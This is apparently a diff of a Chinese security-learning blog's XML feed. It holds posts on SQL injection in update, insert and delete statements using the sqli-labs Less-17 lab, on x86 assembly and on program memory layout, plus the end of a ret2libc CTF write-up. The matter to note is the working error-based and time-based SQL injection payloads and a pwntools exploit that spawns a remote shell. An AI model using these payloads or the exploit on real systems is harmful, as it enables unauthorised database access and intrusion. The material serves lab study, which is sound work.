-<p>1、代码审计：<br>使用check_input函数对输入数据进行过滤，<br>接着以用户名作为条件查询数据库，<br>当查询到数据库存在记录时，更新该密码。<br>这是一个密码重置功能的代码。<br>然而在对输入数据进行过滤的过程中，清洗了用户名，却没有清洗密码，<br>由此导致了sql注入。</p>
-<p>2、check_input函数功能：<br>截取输入的数据中前15个字符，<br>检测服务端是否开启<code>magic_quotes_gpc</code>转义，如果有则删除反斜杠，<br>检测字符串中是否都是数字字符，如果不存在则对特定添加反斜杠，同时以单引号闭合数据，<br>如果都是数字字符，则将其转化为整数。</p>
-<p>3、函数解释：<br>get_magic_quotes_gpc()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/4.png" alt></p>
-<p>stripslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/5.png" alt></p>
-<p>ctype_digit()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
-<p>mysql_real_escape_string()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/7.png" alt></p>
-<p>intval()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/8.png" alt></p>
-<p>addslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/9.png" alt></p>
-<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>在注入点位置的报错注入与延时注入：<br>没有数据回显<del>联合注入取消</del>，没有布尔回显<del>布尔盲注取消</del></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/10.png" alt><br>1、报错注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and updatexml(1,(concat(0x7e,(select database()),0x7e)),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/11.png" alt><br>2、延时盲注</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and if((ord(left((select database()),1))=ascii(&apos;s&apos;)),sleep(1),0)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-<p>payload自行调整。</p>
-<h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>上述为update下的注入。<br>由于update、insert和delete三者应用场景的特殊性，<br>一般不会有数据回显，故一般选取布尔注入和延时注入。<br>1、insert下的注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">insert into Rj45(id,word)values(3,updatexml(1,(concat(0x7e,(select database()),0x7e)),1));</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/12.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入：</span><br><span class="line">insert into Rj45(id,word)values(5,if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0));</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/13.png" alt><br>注意，当延时注入成功后，需要修改插入的id数据,防止出现主键唯一性冲突。<br>2、delete下的注入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">delete from Rj45 where id=0 and updatexml(1,(concat(0x7e,(select database()),0x7e)),1);</span><br><span class="line"></span><br><span class="line">延时注入：</span><br><span class="line">delete from Rj45 where id=3 and if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0);</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/14.png" alt></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>1、mysql注入天书<br>2、php手册<br><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">https://www.php.net/manual/zh/</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>由一个简单的程序学习常见汇编指令</title>
-    <url>/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直以来，内心有股焦急焦虑，急冲冲的学习，急冲冲的比赛，没有时间和心思回过头来静心总结。<br>突然之间想安静下来回顾和记录一下pwn的知识点 <del>其实是写web有点累了，想切换一下脑壳，看心情更新吧</del></p>
-<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/1.png" alt><br>编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc stack.c -o stack -m32</span><br></pre></td></tr></table></figure>
-<h1 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d stack -M intel</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/2.png" alt></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">080483db &lt;fun&gt;:</span><br><span class="line"> 80483db:	55                   	push   ebp//将ebp压入栈</span><br><span class="line"> 80483dc:	89 e5                	mov    ebp,esp//将esp压入栈</span><br><span class="line"> 80483de:	83 ec 10             	sub    esp,0x10//在栈上分配0x10个字节的空间</span><br><span class="line"> 80483e1:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [ebp-0x8],0x1//将0x1存储在[ebp-0x8],dword是双字即四个字节，ptr是指针，这里指[ebp-0x8]地址是一个双字型地址</span><br><span class="line"> 80483e8:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]//将[esp+0x8]的数据复制到eax</span><br><span class="line"> 80483eb:	89 45 fc             	mov    DWORD PTR [ebp-0x4],eax//将eax内的数据复制到[ebp-0x4]</span><br><span class="line"> 80483ee:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]//将[ebp+0x8]内的数据复制到edx</span><br><span class="line"> 80483f1:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]//将[ebp+0xc]内的数据复制到eax</span><br><span class="line"> 80483f4:	01 d0                	add    eax,edx//将edx内的数据与eax内的数据相加，复制到eax</span><br><span class="line"> 80483f6:	c9                   	leave  //等价于mov ebp,esp;pop ebp</span><br><span class="line"> 80483f7:	c3                   	ret   //等价于pop ip;用栈中的数据，修改IP的内容，实现近转移</span><br><span class="line"></span><br><span class="line">080483f8 &lt;main&gt;:</span><br><span class="line"> 80483f8:	55                   	push   ebp</span><br><span class="line"> 80483f9:	89 e5                	mov    ebp,esp</span><br><span class="line"> 80483fb:	6a 14                	push   0x14//将0x14=20压入栈</span><br><span class="line"> 80483fd:	6a 0a                	push   0xa////将0xa=10压入栈</span><br><span class="line"> 80483ff:	e8 d7 ff ff ff       	call   80483db &lt;fun&gt;//调用fun函数</span><br><span class="line"> 8048404:	83 c4 08             	add    esp,0x8//esp+8，进行栈帧还原</span><br><span class="line"> 8048407:	b8 00 00 00 00       	mov    eax,0x0//清空eax内的数据</span><br><span class="line"> 804840c:	c9                   	leave  </span><br><span class="line"> 804840d:	c3                   	ret    </span><br><span class="line"> 804840e:	66 90                	xchg   ax,ax//交换ax;等价于nop</span><br></pre></td></tr></table></figure>
-
-<h1 id="常见汇编指令"><a href="#常见汇编指令" class="headerlink" title="常见汇编指令"></a>常见汇编指令</h1><p>1、寄存器</p>
-<p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/3.png" alt><br>2、常见汇编指令</p>
-<p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/4.png" alt></p>
-<h1 id="下期预告"><a href="#下期预告" class="headerlink" title="下期预告"></a>下期预告</h1><p>可能写如何编写一个简单的汇编程序、可能写函数在栈中的调用过程、ret指令与call指令的深入理解、可能写程序在内存中的分布、编译链接过程、可能写函数调用约定、x86架构与x64架构的不同之处。<br>个人感觉这些都是pwn的基础内容。建议如果想深入学习pwn的话，推荐首先学习《汇编语言(第3版)》。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>程序在内存中的分布</title>
-    <url>/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/</url>
-    <content><![CDATA[<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><p>对于x86架构下的Linux程序，在被载入内存中会展开成如下情况:</p>
-<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/1.png" alt></p>
-<p>1、对于x86 架构的系统来说，器虚拟空间为4GB.<br>2、高位的1GB为内核空间。<br>3、低位的3GB由Text segment(ELF)、Data segment、Bss segment、Heap、Memory mapping Segment、stack。<br>4、Memory mapping Segment存放Linux的动态链接库<br>5、对于stack来说，其最大值为8MB。</p>
-<h1 id="bss"><a href="#bss" class="headerlink" title=".bss"></a>.bss</h1><p>1、作用：<br>bss段用来存放没有被初始化和已经被初始化为0的全局变量</p>
-<p>2、例子<br><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/2.png" alt></p>
-<p>3、编译链接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gcc -g bss.c -o bss</span><br></pre></td></tr></table></figure>
-<p>4、查看</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -h bss | grep bss</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/3.png" alt></p>
-<h1 id="data"><a href="#data" class="headerlink" title=".data"></a>.data</h1><p>1、作用：<br>data段用来存放已经被初始化为非0的全局变量</p>
-<p>2、例子</p>
-<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/4.png" alt></p>
-<p>3、编译链接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -g data.c -o data</span><br></pre></td></tr></table></figure>
-<p>4、查看</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -h data | grep \\.data</span><br></pre></td></tr></table></figure>
-<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/5.png" alt></p>
-<h1 id="rodata"><a href="#rodata" class="headerlink" title=".rodata"></a>.rodata</h1><p>作用：<br>rodata段用来存放常量数据、被编译器自动存放来的字符串和加<code>const</code>关键字的常量数据。</p>
-<h1 id="text"><a href="#text" class="headerlink" title=".text"></a>.text</h1><p>作用：<br>text段用来存放代码和部分整数常量，该段是可执行的。</p>
-<h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>作用：<br>1、stack存放函数的临时变量、局部变量、函数参数和返回值<br>2、由编译器自动分配和释放。</p>
-<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><p>1、作用：<br>heap用来动态分配内存，由程序员控制，交由程序自身决定开辟和释放。<br>malloc&amp;free<br>calloc&amp;realloc<br>2、例子<br>malloc&amp;free<br><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/6.png" alt><br>3、编译链接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gcc heap.c -o heap</span><br></pre></td></tr></table></figure>
-<p>4、查看<br><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/7.png" alt></p>
-<p>5、其他方式</p>
-<p>1）calloc()函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *calloc(size_t number,size_t size);</span><br><span class="line"></span><br><span class="line">用法1</span><br><span class="line">int *p = (int *)calloc(1024,sizeof(int));</span><br><span class="line"></span><br><span class="line">用法2</span><br><span class="line">int *p = (int *)malloc(1024*sizeof(int));</span><br><span class="line">memset(p.0,1024*sizeof(int));</span><br></pre></td></tr></table></figure>
-<p>number表示要分配元素的个数、size表示每个元素的大小、分配的内存空间是number<em>size、返回值为void</em>类型的指针，指向分配号的内存首地址。<br>2）realloc()函数<br>realloc()函数用来重新分配正在使用的一块内存大小。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *realloc(void *ptr,size_t size);</span><br><span class="line"></span><br><span class="line">int *p = (int *)malloc(1024);</span><br><span class="line">p = (int *)realloc(512);// 重新分配为 512字节大小内存</span><br><span class="line">p = (int *)realloc(2048);// 重新分配为2048字节大小内存</span><br></pre></td></tr></table></figure>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/hythink/p/5422602.html" target="_blank" rel="noopener">https://www.cnblogs.com/hythink/p/5422602.html</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>深入理解ret2libc</title>
     <url>/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>针对ret2libc内一类需要计算地址的题型。</p>
@@ -3814,6 +3712,98 @@ https://websec.readthedocs.io/zh/latest/basic/http.html</code></pre></center>]]>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x88+4</span><br><span class="line">p = remote(&apos;111.198.29.45&apos;,36318)</span><br><span class="line">elf = ELF(&apos;./level3&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">first_addr = elf.symbols[&apos;vulnerable_function&apos;]</span><br><span class="line">output_plt_addr = elf.plt[&apos;write&apos;]</span><br><span class="line">link_got_addr = elf.got[&apos;write&apos;]</span><br><span class="line">payload1 = flat([&apos;\x90&apos;*offset,output_plt_addr,first_addr,1,link_got_addr,4])</span><br><span class="line">p.sendlineafter(&quot;Input:\n&quot;,payload1)</span><br><span class="line">link_addr = u32(p.recv(4))</span><br><span class="line">link_libc_addr = libc.symbols[&apos;write&apos;]</span><br><span class="line">system_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">libc_base = link_addr - link_libc_addr</span><br><span class="line">system_addr = libc_base+system_libc_addr</span><br><span class="line">binsh_addr = libc_base+binsh_libc_addr</span><br><span class="line">payload2 = flat([&apos;\x90&apos;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219010627434.png" alt="image-20191219010627434"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>由sqli-labs-Less17学习增删改形式下的sql注入</title>
+    <url>/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>mysql在对数据的处理中有增删改查四个操作。<br>而在sql注入中，往往常见的是<code>select</code>查询形式。<br>那么insert、delete、update呢？</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>在ubuntu下搭建docker和开源vulstudy项目（其内含sqli-labs环境）。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install docker.io -y</span><br><span class="line">sudo apt-get docker-compose -y</span><br><span class="line">sudo apt-get git -y</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">git clone https://github.com/c0ny1/vulstudy.git</span><br><span class="line">cd /vulstudy/sqli-labs</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>1、增</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table_name(column_name1,column_name2)values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name values(&apos;value1&apos;,&apos;value2&apos;);</span><br><span class="line">insert into table_name set column_name1=&apos;value1&apos;,column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/1.png" alt><br>2、删</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from table_name where column_name=&apos;value&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/2.png" alt><br>3、改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=&apos;value2&apos; where column_name2=&apos;value2&apos;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
+<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>sqli-labs-Less17代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//including the Mysql connect parameters.</span><br><span class="line">include(&quot;../sql-connections/sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function check_input($value)</span><br><span class="line">	&#123;</span><br><span class="line">	if(!empty($value))</span><br><span class="line">		&#123;</span><br><span class="line">		// truncation (see comments)</span><br><span class="line">		$value = substr($value,0,15);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Stripslashes if magic quotes enabled</span><br><span class="line">		if (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		// Quote if not a number</span><br><span class="line">		if (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	else</span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	return $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">//making sure uname is not injectable</span><br><span class="line">$uname=check_input($_POST[&apos;uname&apos;]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);</span><br><span class="line">fwrite($fp,&apos;New Password:&apos;.$passwd.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">//echo $row;</span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;</span><br><span class="line">		$row1 = $row[&apos;username&apos;];  	</span><br><span class="line">		//echo &apos;Your Login name:&apos;. $row1;</span><br><span class="line">		$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br><span class="line">		mysql_query($update);</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">		if (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;</span><br><span class="line">			//echo &quot; You password has been successfully updated &quot; ;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&apos;;</span><br><span class="line">		//echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  	&#125;</span><br><span class="line">	else  </span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">		//echo &quot;Bug off you Silly Dumb hacker&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&apos;;</span><br><span class="line"></span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1、代码审计：<br>使用check_input函数对输入数据进行过滤，<br>接着以用户名作为条件查询数据库，<br>当查询到数据库存在记录时，更新该密码。<br>这是一个密码重置功能的代码。<br>然而在对输入数据进行过滤的过程中，清洗了用户名，却没有清洗密码，<br>由此导致了sql注入。</p>
+<p>2、check_input函数功能：<br>截取输入的数据中前15个字符，<br>检测服务端是否开启<code>magic_quotes_gpc</code>转义，如果有则删除反斜杠，<br>检测字符串中是否都是数字字符，如果不存在则对特定添加反斜杠，同时以单引号闭合数据，<br>如果都是数字字符，则将其转化为整数。</p>
+<p>3、函数解释：<br>get_magic_quotes_gpc()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/4.png" alt></p>
+<p>stripslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/5.png" alt></p>
+<p>ctype_digit()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
+<p>mysql_real_escape_string()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/7.png" alt></p>
+<p>intval()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/8.png" alt></p>
+<p>addslashes()：<br><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/9.png" alt></p>
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>在注入点位置的报错注入与延时注入：<br>没有数据回显<del>联合注入取消</del>，没有布尔回显<del>布尔盲注取消</del></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/10.png" alt><br>1、报错注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and updatexml(1,(concat(0x7e,(select database()),0x7e)),1)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/11.png" alt><br>2、延时盲注</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=&apos;) and if((ord(left((select database()),1))=ascii(&apos;s&apos;)),sleep(1),0)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>payload自行调整。</p>
